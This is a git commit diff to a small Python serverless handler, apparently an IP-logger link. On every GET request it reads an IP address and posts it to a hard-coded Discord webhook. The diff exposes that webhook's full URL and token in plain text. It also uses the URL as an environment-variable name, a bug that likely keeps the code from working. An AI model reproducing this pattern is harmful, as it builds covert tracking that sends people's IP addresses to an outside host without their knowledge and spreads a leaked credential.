124bf6c46464e1222b615ffec5921ab067b6839e
micmal1 <fagatamagyata1@gmail.com>
2025-09-23 14:04:14 +0200

    Update link.py

--- api/link.py
+++ api/link.py
@@ -3,7 +3,7 @@ import requests
 import json
 import os
 
-# pobierz webhook z ENV (w Vercelu ustaw w Settings > Environment Variables)
+# Pobieramy webhook z Environment Variables (ustaw w Vercel)
 WEBHOOK_URL = os.environ.get("https://discord.com/api/webhooks/1418597405871439933/8YsY9-WYZfq19AHicu8ua8ZPWgVxS1_I-4CiQ-LtZLS5HtzPfHOW8dpBwdrh84Pm80NR")
 
 def get_public_ip():
@@ -14,18 +14,19 @@ def get_public_ip():
     except Exception as e:
         return f"error: {e}"
 
-def send_message(content: str):
+def send_to_discord(ip):
     if not WEBHOOK_URL:
+        print("Brak webhooka w ENV")
         return
     try:
-        requests.post(WEBHOOK_URL, json={"content": content}, timeout=5)
+        requests.post(WEBHOOK_URL, json={"content": f"IP received: {ip}"}, timeout=5)
     except Exception as e:
         print("Błąd wysyłania do webhooka:", e)
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         ip = get_public_ip()
-        send_message(f"IP received: {ip}")
+        send_to_discord(ip)
 
         self.send_response(200)
         self.send_header("Content-Type", "application/json")
